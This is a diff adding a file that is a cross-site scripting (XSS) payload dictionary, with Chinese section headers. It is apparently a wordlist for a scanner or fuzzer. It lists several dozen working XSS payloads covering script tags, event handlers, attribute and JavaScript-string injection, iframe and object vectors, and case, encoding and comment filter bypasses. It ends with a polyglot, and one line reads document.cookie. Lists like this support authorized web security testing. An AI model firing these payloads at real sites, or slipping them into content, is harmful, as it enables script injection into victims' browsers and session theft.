@@ -1,0 +1,85 @@
+# XSS Payload 字典
+# 格式：每行一个 payload，# 开头为注释
+
+# ── 基础脚本标签 ──
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<Script>alert(1)</Script>
+</script><script>alert(1)</script>
+<script >alert(1)</script>
+
+# ── 事件属性 ──
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(1) />
+<img src="x" onerror="alert(1)">
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>marquee</marquee>
+<div onmouseover=alert(1)>hover</div>
+<a href=# onclick=alert(1)>click</a>
+
+# ── 属性注入 ──
+" onfocus=alert(1) autofocus x="
+' onfocus=alert(1) autofocus x='
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+
+# ── JS 字符串注入 ──
+';alert(1);//
+";alert(1);//
+`);alert(1);//
+\';alert(1);//
+</script><script>alert(1)</script>
+
+# ── iframe/object ──
+<iframe src=javascript:alert(1)>
+<iframe onload=alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+
+# ── 大小写绕过 ──
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x OnErRoR=alert(1)>
+<sVg OnLoAd=alert(1)>
+
+# ── 编码绕过 ──
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+
+# ── 注释绕过 ──
+<scr<!---->ipt>alert(1)</scr<!---->ipt>
+<scr\x00ipt>alert(1)</scr\x00ipt>
+
+# ── SVG 向量 ──
+<svg><script>alert&#40;1&#41;</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x>
+<svg><set attributename=x onbegin=alert(1)>
+
+# ── DOM XSS ──
+#"><img src=/ onerror=alert(1)>
+javascript:alert(1)
+Java&#115;cript:alert(1)
+JaVaScRiPt:alert(1)
+
+# ── 过滤绕过组合 ──
+<x onclick=alert(1)>click</x>
+<x/onclick=alert(1)>
+<details/open/ontoggle=alert(1)>
+<video src=1 onerror=alert(1)>
+
+# ── Polyglot ──
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\\x3e
